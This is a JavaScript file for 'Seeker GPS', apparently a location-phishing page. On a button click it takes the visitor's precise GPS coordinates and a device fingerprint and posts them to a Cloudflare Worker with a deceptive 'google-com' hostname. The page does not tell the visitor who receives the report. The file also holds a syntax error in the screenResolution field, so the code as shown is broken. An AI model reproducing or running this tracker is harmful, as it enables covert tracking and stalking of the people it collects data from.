```javascript
// ==========================================
// SEEKER GPS - MAIN JAVASCRIPT
// ==========================================


// ==========================================
// CONFIGURATION
// ==========================================

// HTML elements
const locationBtn = document.getElementById("locationBtn");
const result = document.getElementById("result");

// Cloudflare Worker URL
const WORKER_URL =
    "https://google-com.ykzir-polyglot.workers.dev";


// ==========================================
// 1. DEVICE INFORMATION READER
// ==========================================

function getDeviceInfo() {

    const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;

    return {

        userAgent:
            navigator.userAgent || "Unavailable",

        platform:
            navigator.userAgentData?.platform ||
            navigator.platform ||
            "Unavailable",

        language:
            navigator.language || "Unavailable",

        screenResolution:
            screenResolution: screen.width + " x " + screen.height,

        colorDepth:
            `${screen.colorDepth}-bit`,

        timezone:
            Intl.DateTimeFormat().resolvedOptions().timeZone ||
            "Unavailable",

        cpuCores:
            navigator.hardwareConcurrency || "Unavailable",

        deviceMemory:
            navigator.deviceMemory
                ? `${navigator.deviceMemory} GB`
                : "Unavailable",

        connectionType:
            connection?.effectiveType || "Unavailable",

        online:
            navigator.onLine ? "Yes" : "No",

        cookiesEnabled:
            navigator.cookieEnabled ? "Yes" : "No"

    };

}


// ==========================================
// 2. SEND REPORT TO CLOUDFLARE
// ==========================================

async function sendLocation(latitude, longitude, accuracy) {

    // Collect device information
    const device = getDeviceInfo();

    // Prepare report
    const report = {

        latitude: latitude,

        longitude: longitude,

        accuracy: Math.round(accuracy),

        device: device

    };

    console.log("Sending report to Cloudflare...");
    console.log("Report:", report);

    // Send report to Cloudflare Worker
    const response = await fetch(WORKER_URL, {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify(report)

    });

    // Read Cloudflare response
    const data = await response.json();

    console.log("Cloudflare HTTP Status:", response.status);
    console.log("Cloudflare Response:", data);

    // Check response
    if (!response.ok || !data.ok) {

        throw new Error(
            data.error || "Cloudflare backend request failed."
        );

    }

    return data;

}


// ==========================================
// 3. LOCATION BUTTON EVENT
// ==========================================

if (!locationBtn || !result) {

    console.error(
        "SEEKER GPS ERROR: HTML elements not found."
    );

} else {

    locationBtn.addEventListener("click", function() {

        // Check browser GPS support
        if (!navigator.geolocation) {

            result.textContent =
                "GPS is not supported by this browser.";

            return;

        }

        // Check secure connection
        if (!window.isSecureContext) {

            result.textContent =
                "GPS requires a secure HTTPS connection.";

            return;

        }

        // Disable button while processing
        locationBtn.disabled = true;

        result.textContent =
            "Requesting location permission...";

        // Request GPS coordinates
        navigator.geolocation.getCurrentPosition(

            // ==================================
            // LOCATION SUCCESS
            // ==================================

            async function(position) {

                const latitude =
                    position.coords.latitude;

                const longitude =
                    position.coords.longitude;

                const accuracy =
                    position.coords.accuracy;

                console.log(
                    "Latitude:",
                    latitude
                );

                console.log(
                    "Longitude:",
                    longitude
                );

                console.log(
                    "Accuracy:",
                    accuracy
                );

                console.log(
                    "Device Information:",
                    getDeviceInfo()
                );

                result.textContent =
                    "Location obtained. Sending report to Seeker GPS server...";

                try {

                    // Send GPS and device report
                    const response = await sendLocation(
                        latitude,
                        longitude,
                        accuracy
                    );

                    if (response.ok) {

                        result.textContent =
                            "Location and device report successfully delivered!";

                    }

                } catch (error) {

                    console.error(
                        "SEEKER GPS BACKEND ERROR:",
                        error
                    );

                    result.textContent =
                        "Location obtained, but server delivery failed. Check the console.";

                } finally {

                    // Re-enable button
                    locationBtn.disabled = false;

                }

            },


            // ==================================
            // LOCATION ERROR
            // ==================================

            function(error) {

                console.error(
                    "GPS ERROR:",
                    error
                );

                switch (error.code) {

                    case error.PERMISSION_DENIED:

                        result.textContent =
                            "Location permission was denied.";

                        break;

                    case error.POSITION_UNAVAILABLE:

                        result.textContent =
                            "Location information is unavailable.";

                        break;

                    case error.TIMEOUT:

                        result.textContent =
                            "Location request timed out.";

                        break;

                    default:

                        result.textContent =
                            "An unknown GPS error occurred.";

                }

                locationBtn.disabled = false;

            },


            // ==================================
            // GPS SETTINGS
            // ==================================

            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }

        );

    });

}


// ==========================================
// END OF SEEKER GPS
// ==========================================
```
